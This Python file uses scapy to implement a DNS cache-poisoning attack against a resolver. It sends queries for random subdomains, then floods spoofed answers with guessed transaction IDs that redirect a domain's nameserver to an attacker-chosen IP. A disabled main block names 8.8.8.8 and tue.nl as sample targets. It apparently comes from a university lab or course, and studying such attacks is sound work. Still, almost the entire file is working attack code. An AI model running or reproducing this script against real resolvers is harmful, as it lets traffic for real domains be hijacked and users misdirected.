from scapy.all import IP, UDP, DNS, DNSQR, DNSRR, sr1, send
import utils

from argparse import Namespace

def loud(args):
    poisoned = False
    while not poisoned:
        # generate random subdomain, i.e. 1234www5678.example.com
        queryDomain = utils.getRandomSubdomain() + args.targetDomain

        # send the query with the target domain to the victim
        pkt = IP(dst=args.victim) / UDP(sport=utils.getRandomPort()) / DNS(qr=0, qd=DNSQR(qname=queryDomain))
        send(pkt)

        # after this the victim will start asking other DNS servers (after first try others will be cached so the victim will only ask the authoritative server) for the IP
        # flood the victim with the forged query answers including the addressToForge
        # each of the packets should contain an NS and an A record: NS record - targetDomain NS args.soaDomain ; A record - args.soaDomain A addressToForge ; at the same time the authoritative server will be sending the same A record but instead of addressToForge he will put his IP (args.soaIP)
        # try as many TXID combinations as possible (maybe implement calculation of toplogical distance to calculate the number of queries) and set TTL to a very high value
        # make sure to set the source IP to args.soaIP
        for _ in xrange(30): # stream of 30 forged packets (TODO: test if the amount is right)
            pkt = IP(dst=args.victim) / UDP() / DNS(id=utils.getRandomTXID(), aa=1, qr=1, qd=DNSQR(qname=queryDomain), ns=DNSRR(rrname=args.targetDomain, type='NS', ttl=args.ttl, rdata=args.soaDomain[0]), ar=DNSRR(rrname=args.soaDomain[0], type='A', ttl=args.ttl, rdata=args.addressToForge))
            send(pkt)

        # send query for SOA domain, if the response is same as IP we sent earlier, victim's cache has been poisoned (stop the loop)
        pkt = IP(dst=args.victim) / UDP() / DNS(qr=0, qd=DNSQR(qname=args.soaDomain[0]))
        ans = sr1(pkt)
        if ans[DNS].an.rdata == args.addressToForge: # BINGO
            poisoned = True

if False: #__name__ == "_main_":
	args = Namespace()
	args.victim = '8.8.8.8'
	args.targetDomain = 'tue.nl'
	args.addressToForge = '131.155.196.103' # Filip's IP
	args.ttl = 250
	args.soaDomain = ['ns1.tue.nl', 'ns2.tue.nl']
	loud(args)
